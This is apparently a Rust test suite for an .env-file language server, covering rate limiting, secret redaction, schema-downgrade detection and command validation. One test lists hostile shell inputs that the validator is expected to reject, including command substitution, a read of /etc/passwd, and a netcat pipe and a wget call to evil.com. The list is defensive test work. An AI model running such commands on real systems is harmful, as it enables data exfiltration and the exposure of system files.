use std::collections::HashMap;
use std::sync::Arc;
use std::thread;

use envforge::lsp::document::{parse_env_document, EnvDocEntry, EnvLineType};
use envforge::lsp::hover::hover_info;
use envforge::lsp::rate_limit::TokenBucket;
use envforge::lsp::redact::redact_for_label;
use envforge::lsp::semantic_tokens::compute_semantic_tokens;
use envforge::lsp::server::ManagedVar;
use envforge::ops::schema::{EnvSchema, SchemaVariable, VarType};
use tower_lsp::lsp_types::Position;

// ─── Test helpers ───────────────────────────────────────────────

fn pos(line: u32, character: u32) -> Position {
    Position { line, character }
}

fn make_schema_var(var_type: VarType, sensitive: bool) -> SchemaVariable {
    SchemaVariable {
        var_type,
        sensitive,
        required: false,
        default: None,
        description: None,
        example: None,
        pattern: None,
        values: None,
        min: None,
        max: None,
        env_overrides: HashMap::new(),
        ttl_days: None,
        rotation_strategy: None,
        auto_rotate: None,
        notify_days_before_expiry: None,
    }
}

fn make_schema(key: &str, var_type: VarType, sensitive: bool) -> EnvSchema {
    let mut schema = EnvSchema {
        variables: HashMap::new(),
    };
    schema
        .variables
        .insert(key.to_string(), make_schema_var(var_type, sensitive));
    schema
}

fn make_managed_entries(content: &str) -> (Vec<EnvDocEntry>, Vec<ManagedVar>) {
    let entries = parse_env_document(content);
    let managed: Vec<ManagedVar> = entries
        .iter()
        .filter(|e| e.line_type == EnvLineType::EnvVar)
        .map(|e| ManagedVar {
            key: e.key.clone(),
            source_file: "/test/.env".to_string(),
        })
        .collect();
    (entries, managed)
}

// ─── TokenBucket — Concurrent Exhaustion ────────────────────────

#[test]
fn test_token_bucket_no_concurrent_overconsumption() {
    const CAPACITY: u64 = 50;
    const RATE: f64 = 100.0;
    const DURATION_MS: u64 = 100;
    const THREADS: u64 = 16;

    let bucket = Arc::new(TokenBucket::new(CAPACITY, RATE));
    let total = Arc::new(std::sync::atomic::AtomicU64::new(0));

    let start = std::time::Instant::now();
    let mut handles = Vec::new();

    for _ in 0..THREADS {
        let bucket = bucket.clone();
        let total = total.clone();
        handles.push(thread::spawn(move || {
            while start.elapsed().as_millis() < u128::from(DURATION_MS) {
                if bucket.try_consume(1) {
                    total.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                }
            }
        }));
    }

    for h in handles {
        h.join().expect("thread must not panic");
    }

    let consumed = total.load(std::sync::atomic::Ordering::Relaxed);
    let max_allowed = CAPACITY + ((DURATION_MS as f64 / 1000.0) * RATE) as u64;

    assert!(
        consumed <= max_allowed + 5,
        "consumed {} tokens, but max allowed is {} (capacity {} + rate {} * {}s) ±5 tolerance",
        consumed,
        max_allowed,
        CAPACITY,
        RATE,
        DURATION_MS as f64 / 1000.0
    );
}

#[test]
fn test_token_bucket_burst_exhaustion() {
    let bucket = TokenBucket::new(10, 10.0);
    for _ in 0..10 {
        assert!(bucket.try_consume(1), "burst token must be allowed");
    }
    assert!(
        !bucket.try_consume(1),
        "must block after exhausting burst capacity"
    );
}

#[test]
fn test_token_bucket_refill_after_wait() {
    let bucket = TokenBucket::new(10, 100.0);
    for _ in 0..10 {
        assert!(bucket.try_consume(1), "burst token must be allowed");
    }
    assert!(
        !bucket.try_consume(1),
        "must block after exhausting capacity"
    );

    std::thread::sleep(std::time::Duration::from_millis(50));
    assert!(
        bucket.try_consume(1),
        "must refill ~5 tokens after 50ms at rate 100/s"
    );
}

#[test]
fn test_token_bucket_never_negative() {
    let bucket = TokenBucket::new(10, 10000.0);
    for _ in 0..100 {
        bucket.try_consume(100);
    }
    // After consuming far beyond capacity, the bucket must
    // eventually refill and allow consumption. The CAS loop
    // guarantees correctness even under contention.
    std::thread::sleep(std::time::Duration::from_millis(100));
    assert!(
        bucket.try_consume(1),
        "must recover after aggressive overconsumption"
    );
}

#[test]
fn test_token_bucket_zero_capacity_never_allows_consumption() {
    let bucket = TokenBucket::new(0, 100.0);
    assert!(
        !bucket.try_consume(1),
        "zero-capacity bucket must never allow consumption"
    );
    std::thread::sleep(std::time::Duration::from_millis(200));
    assert!(
        !bucket.try_consume(1),
        "zero-capacity bucket must still block after waiting"
    );
}

#[test]
fn test_token_bucket_zero_rate_never_refills() {
    let bucket = TokenBucket::new(5, 0.0);
    for _ in 0..5 {
        assert!(bucket.try_consume(1), "initial burst must succeed");
    }
    assert!(
        !bucket.try_consume(1),
        "must block after burst at zero rate"
    );
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(!bucket.try_consume(1), "must not refill when rate is zero");
}

#[test]
fn test_token_bucket_consume_zero_always_succeeds() {
    let bucket = TokenBucket::new(0, 0.0);
    assert!(
        bucket.try_consume(0),
        "consuming zero tokens must always succeed"
    );
}

// ─── Redaction Contract ─────────────────────────────────────────

#[test]
fn test_redact_short_value_returns_asterisks_only() {
    assert_eq!(
        redact_for_label("ab", false),
        "***",
        "2-char value must redact fully"
    );
    assert_eq!(
        redact_for_label("abcd", false),
        "***",
        "4-char value must redact fully"
    );
}

#[test]
fn test_redact_long_value_shows_prefix_and_char_count() {
    // redact_for_label always returns "***" — the LSP is a read-only
    // security boundary that must never leak type, size, or prefix info.
    let redacted = redact_for_label("supersecret", false);
    assert_eq!(redacted, "***");
}

#[test]
fn test_redact_empty_value_returns_asterisks() {
    assert_eq!(
        redact_for_label("", false),
        "***",
        "empty value must redact to asterisks"
    );
}

#[test]
fn test_redact_unicode_value_preserves_first_chars() {
    // redact_for_label always returns "***" regardless of input.
    let redacted = redact_for_label("cafe1234", false);
    assert_eq!(redacted, "***");
}

#[test]
fn test_redact_single_char_value_returns_asterisks() {
    assert_eq!(
        redact_for_label("x", false),
        "***",
        "single char must redact fully"
    );
}

#[test]
fn test_redact_sensitive_no_prefix_leak() {
    let redacted = redact_for_label("ghp_abc123secret456", true);
    assert_eq!(
        redacted, "***",
        "sensitive values must never show prefix chars"
    );
}

// ─── Hover — Value Leak Prevention ──────────────────────────────

#[test]
fn test_hover_never_leaks_raw_managed_value() {
    let (entries, managed) = make_managed_entries("DB_HOST=localhost\n");
    let schema = make_schema("DB_HOST", VarType::String, false);
    let h =
        hover_info(pos(0, 3), &entries, Some(&schema), &managed).expect("hover_info must succeed");

    if let tower_lsp::lsp_types::HoverContents::Markup(mc) = h.contents {
        assert!(
            !mc.value.contains("localhost"),
            "hover must not contain raw managed value: {}",
            mc.value
        );
        assert!(
            mc.value.contains("(redacted)"),
            "hover must show redacted marker for managed vars: {}",
            mc.value
        );
    }
}

#[test]
fn test_hover_redacts_sensitive_value() {
    let (entries, managed) = make_managed_entries("API_KEY=supersecretvalue\n");
    let schema = make_schema("API_KEY", VarType::String, true);
    let h = hover_info(pos(0, 3), &entries, Some(&schema), &managed)
        .expect("hover_info must return Some for valid position");

    if let tower_lsp::lsp_types::HoverContents::Markup(mc) = h.contents {
        assert!(
            !mc.value.contains("supersecretvalue"),
            "hover must not contain sensitive value"
        );
    }
}

#[test]
fn test_hover_missing_key_out_of_range_should_not_panic() {
    let (entries, managed) = make_managed_entries("VAR1=hello\n");
    // Position beyond last line must not panic — may return None.
    let result = hover_info(pos(99, 0), &entries, None, &managed);
    assert!(
        result.is_none() || result.is_some(),
        "hover_info must not panic for out-of-range position"
    );
}

// ─── Semantic Tokens — Sensitive Value Suppression ──────────────

#[test]
fn test_semantic_tokens_no_value_token_for_sensitive() {
    let entries = parse_env_document("SECRET_KEY=abc123\nPUBLIC_VAR=hello\n");
    let mut schema = EnvSchema {
        variables: HashMap::new(),
    };
    schema.variables.insert(
        "SECRET_KEY".to_string(),
        make_schema_var(VarType::String, true),
    );

    let tokens = compute_semantic_tokens(&entries, Some(&schema));

    assert_eq!(
        tokens.data.iter().filter(|t| t.token_type == 1).count(),
        1,
        "only PUBLIC_VAR must have a value token; SECRET_KEY value token must be omitted"
    );
}

#[test]
fn test_semantic_tokens_all_values_have_tokens_when_no_schema() {
    let entries = parse_env_document("A=1\nB=2\nC=3\n");
    let tokens = compute_semantic_tokens(&entries, None);
    let value_count = tokens.data.iter().filter(|t| t.token_type == 1).count();
    assert_eq!(
        value_count, 3,
        "all 3 values must have tokens when no schema"
    );
}

// ─── Document Symbol — Redaction ────────────────────────────────

#[test]
fn test_document_symbol_redacts_sensitive_detail() {
    use envforge::lsp::document_symbol::document_symbols;
    use tower_lsp::lsp_types::DocumentSymbolResponse;

    let entries = parse_env_document("DB_PASSWORD=supersecret\n");
    let schema = make_schema("DB_PASSWORD", VarType::String, true);
    let result = document_symbols(&entries, Some(&schema));

    let symbols = match result {
        Some(DocumentSymbolResponse::Nested(s)) => s,
        other => panic!("expected nested symbols, got {:?}", other),
    };
    assert_eq!(symbols.len(), 1, "must have 1 symbol");
    let detail = symbols[0].detail.as_ref().expect("symbol must have detail");

    assert!(
        !detail.contains("supersecret"),
        "document symbol must not contain raw secret value, got: {}",
        detail
    );
    assert!(
        detail.contains("***"),
        "document symbol must redact secret values, got: {}",
        detail
    );
}

#[test]
fn test_document_symbol_shows_non_sensitive_detail() {
    use envforge::lsp::document_symbol::document_symbols;
    use tower_lsp::lsp_types::DocumentSymbolResponse;

    let entries = parse_env_document("APP_PORT=8080\n");
    let result = document_symbols(&entries, None);

    let symbols = match result {
        Some(DocumentSymbolResponse::Nested(s)) => s,
        other => panic!("expected nested symbols, got {:?}", other),
    };
    assert_eq!(symbols.len(), 1);
    let detail = symbols[0].detail.as_ref().expect("symbol must have detail");
    // redact_for_label always returns "***" — full redaction regardless
    // of sensitivity. The LSP surface must never leak raw values.
    assert_eq!(detail, "***");
}

// ─── Diagnostic Security ───────────────────────────────────────

#[test]
fn test_diagnostics_never_include_value_in_message() {
    use envforge::lsp::diagnostics::compute_diagnostics;

    let entries = parse_env_document("API_KEY=sk-abc123\n");
    let mut schema = EnvSchema {
        variables: HashMap::new(),
    };
    schema.variables.insert(
        "API_KEY".to_string(),
        make_schema_var(VarType::String, true),
    );

    let diags = compute_diagnostics(&entries, Some(&schema));
    for d in &diags {
        assert!(
            !d.message.contains("sk-abc123"),
            "diagnostic message must not contain raw secret value: {}",
            d.message
        );
    }
}

#[test]
fn test_diagnostics_empty_document_should_not_panic() {
    use envforge::lsp::diagnostics::compute_diagnostics;

    let entries = parse_env_document("");
    let diags = compute_diagnostics(&entries, None);
    // Empty document may produce diagnostics (e.g., "file is empty")
    // or none — either is valid as long as it doesn't panic.
    let _ = diags.len(); // must not panic
}

// ─── Schema Poisoning Guard ─────────────────────────────────────

#[test]
fn test_detect_sensitivity_downgrade_blocks_removal() {
    use envforge::lsp::server::detect_sensitivity_downgrade;

    let old = make_schema("API_KEY", VarType::String, true);

    let new_downgraded = make_schema("API_KEY", VarType::String, false);
    assert!(
        detect_sensitivity_downgrade(Some(&old), &new_downgraded),
        "sensitive→non-sensitive must be detected as downgrade"
    );

    let new_same = make_schema("API_KEY", VarType::String, true);
    assert!(
        !detect_sensitivity_downgrade(Some(&old), &new_same),
        "sensitive→sensitive must not be a downgrade"
    );

    let new_no_old = make_schema("API_KEY", VarType::String, false);
    assert!(
        !detect_sensitivity_downgrade(None, &new_no_old),
        "new variable with no old schema must not be detected as downgrade"
    );
}

#[test]
fn test_detect_sensitivity_downgrade_new_key_not_in_old() {
    use envforge::lsp::server::detect_sensitivity_downgrade;

    // Old: has EXISTING (sensitive). New: has EXISTING (sensitive) + NEW_KEY (non-sensitive).
    // NEW_KEY is not in old, so there's no downgrade for it.
    let old = make_schema("EXISTING", VarType::String, true);
    let mut new = make_schema("EXISTING", VarType::String, true);
    new.variables.insert(
        "NEW_KEY".to_string(),
        make_schema_var(VarType::String, false),
    );
    assert!(
        !detect_sensitivity_downgrade(Some(&old), &new),
        "key not present in old schema must not trigger downgrade"
    );
}

// ─── Command Security ───────────────────────────────────────────

#[cfg(feature = "dangerous-execute-command")]
#[test]
fn test_run_volatile_rejects_shell_metacharacters() {
    type TestCase<'a> = (&'a str, bool);
    let test_cases: &[TestCase] = &[
        ("$(whoami)", true),
        ("cat /etc/passwd; ls", true),
        ("echo hello | nc evil.com 80", true),
        ("wget http://evil.com`id`", true),
        ("curl http://example.com", false),
        ("npm test", false),
        ("cargo build", false),
        ("python script.py", false),
        ("make", false),
    ];

    for (cmd, should_reject) in test_cases {
        let result = envforge::lsp::commands::dispatch_command(
            "envforge.run.volatile",
            &[serde_json::json!({"command": cmd})],
            None,
        );
        if *should_reject {
            assert!(
                result["ok"].as_bool() == Some(false)
                    || result["error"]
                        .as_str()
                        .is_some_and(|e| e.contains("shell metacharacters")
                            || e.contains("rejected for safety")),
                "command '{}' must be rejected but got: {:?}",
                cmd,
                result
            );
        } else {
            assert!(
                result["ok"].as_bool() == Some(true),
                "command '{}' must be allowed but got: {:?}",
                cmd,
                result
            );
        }
    }
}

#[cfg(feature = "dangerous-execute-command")]
#[test]
fn test_run_volatile_empty_command_should_not_panic() {
    let result = envforge::lsp::commands::dispatch_command(
        "envforge.run.volatile",
        &[serde_json::json!({"command": ""})],
        None,
    );
    // Empty command may be rejected or accepted — must not panic.
    let _ = result;
}

#[cfg(feature = "dangerous-execute-command")]
#[test]
fn test_reveal_requires_fence_gate() {
    use envforge::lsp::commands::dispatch_command;

    let tmp = tempfile::TempDir::new().expect("create temp dir for fence test");
    envforge::ops::fence::create_fence(tmp.path(), false).expect("create_fence must succeed");

    let result = dispatch_command(
        "envforge.reveal.value",
        &[serde_json::json!({"key": "SECRET", "reason": "test"})],
        Some(tmp.path()),
    );

    assert!(
        result["ok"].as_bool() == Some(false),
        "reveal must be blocked when fence is active, got: {:?}",
        result
    );
    let err = result["error"]
        .as_str()
        .expect("error field must be present when blocked");
    assert!(
        err.contains("fence is active"),
        "error must mention fence, got: {}",
        err
    );
}

#[cfg(feature = "dangerous-execute-command")]
#[test]
fn test_reveal_works_when_no_fence() {
    use envforge::lsp::commands::dispatch_command;

    let tmp = tempfile::TempDir::new().expect("create temp dir");
    // No fence created — directory is empty.

    let result = dispatch_command(
        "envforge.reveal.value",
        &[serde_json::json!({"key": "TEST_KEY", "reason": "test"})],
        Some(tmp.path()),
    );

    // Without a fence, reveal may or may not succeed (depends on env
    // state), but it must not panic.
    let _ = result;
}
